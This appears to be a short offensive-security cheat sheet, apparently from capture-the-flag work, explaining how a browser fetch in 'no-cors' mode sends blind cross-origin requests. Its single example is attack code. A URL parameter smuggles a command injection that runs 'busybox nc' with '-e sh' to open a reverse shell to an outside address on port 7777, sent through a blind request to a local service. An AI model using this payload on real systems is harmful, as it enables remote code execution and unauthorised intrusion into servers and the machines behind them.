# Web tricks - List of short tricks

## CORS bypass - blind request
```
If your GET/POST request is blocked by CORS policy i.e error like "CORS error, missing Authorized-header...",
try to use : mode :'no-cors' to run your js. You will send blind request as:
- No status code - You won't know if the server returned 200 OK or 404 Not Found
- No response body - You can't read any output from the server
- No headers - You can't see if the server added any information

Example :
  const parameter = "a[$(busybox nc 10.10.14.98 7777 -e sh)]";
  const encodedParameter = encodeURIComponent(parameter);
  const url = `http://127.0.0.1:5000/routines/${encodedParameter}`;
  
  console.log('Encoded URL:', url);
  
  fetch(url, {
    method: 'GET',
    mode: 'no-cors',  // This sets the request to no-cors mode
    cache: 'no-cache',
    credentials: 'omit',  // No credentials with no-cors
    headers: {
      // Only simple headers allowed in no-cors mode
      'Accept': 'text/plain',
      'Accept-Language': 'en-US',
      // All other custom headers will be stripped
    }
  })
  .then(response => {
    // THIS WILL NOT WORK AS EXPECTED
    // With no-cors mode, response is "opaque":
    console.log('Response type:', response.type); // Will be 'opaque'
    console.log('Response status:', response.status); // Will be 0
    console.log('Response OK?', response.ok); // Will be false
    console.log('Response headers:', [...response.headers]); // Will be empty
    
    // ANY OF THESE WILL FAIL:
    // response.text().then(text => console.log('Response:', text));
    // response.json().then(data => console.log('Response:', data));
    
    // You cannot access the response body at all
    console.log('Request sent (but cannot verify success)');
  })
  .catch(error => {
    // Network errors (like DNS failure) will still trigger this
    console.error('Network error - request failed completely:', error);
  });

```
